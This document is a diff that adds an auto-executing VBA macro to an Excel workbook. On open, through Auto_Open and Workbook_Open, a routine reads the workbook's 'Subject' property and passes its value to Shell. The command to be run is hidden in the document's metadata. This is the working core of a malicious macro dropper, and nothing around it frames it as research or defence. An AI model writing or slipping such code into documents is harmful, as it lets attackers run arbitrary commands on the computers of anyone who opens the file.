@@ -1,0 +1,19 @@
+Sub Auto_Open()
+    kincaid
+End Sub
+
+Sub kincaid()
+    
+    Dim strProgramName As String
+    Dim strArgument As String
+    
+    Set doc = ActiveWorkbook
+    
+    strProgramName = doc.BuiltinDocumentProperties("Subject").Value
+    
+    Call Shell("""" & strProgramName & """", vbNormalFocus)
+
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
